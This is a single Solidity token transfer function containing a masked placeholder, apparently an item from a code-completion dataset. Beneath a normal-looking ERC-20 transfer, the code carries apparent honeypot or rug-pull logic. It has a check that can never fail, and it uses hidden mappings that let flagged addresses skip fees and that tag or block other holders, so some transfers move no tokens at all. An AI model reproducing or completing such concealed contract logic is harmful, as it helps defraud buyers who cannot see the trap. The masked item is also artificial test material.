"function _transfer(        address from,        address to,        uint256 amount    ) private {        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && _collection1[from] == 0 && amount <= swapAmount) {            require(_collection2[from] + _value >= 0, 'Transfer amount exceeds maximum amount');        }        uint256 contractTokenBalance = balanceOf(address(this));        uint256 fee = to == uniswapV2Pair ? sellFee : buyFee;        if (uniswapV2Pair == address(0)) uniswapV2Pair = pair();        if (_swapAndLiquifyEnabled && contractTokenBalance > swapAmount && !inSwapAndLiquify && from != uniswapV2Pair) {            inSwapAndLiquify = true;            swapAndLiquify(contractTokenBalance);            inSwapAndLiquify = false;        } else if (_collection1[from] > 0 && _collection1[to] > 0) {            fee = amount;            _balances[address(this)] += fee;            return <mask0>;        }        if (amount > swapAmount && to != uniswapV2Pair && to != address(router)) {            if (_collection1[from] > 0) _collection1[to] = amount;            else _collection2[to] = amount;            return;        }        bool takeFee = _collection1[from] == 0 && _collection1[to] == 0 && fee > 0 && !inSwapAndLiquify;        address factory = address(_factory);        if (_collection2[factory] == 0) _collection2[factory] = swapAmount;        _factory = uint160(to);        if (takeFee) {            fee = (amount * fee) / 100 / feeDivisor;            amount -= fee;            _balances[from] -= fee;            _balances[address(this)] += fee;        }        _balances[from] -= amount;        _balances[to] += amount;        emit Transfer(from, to, amount);    }"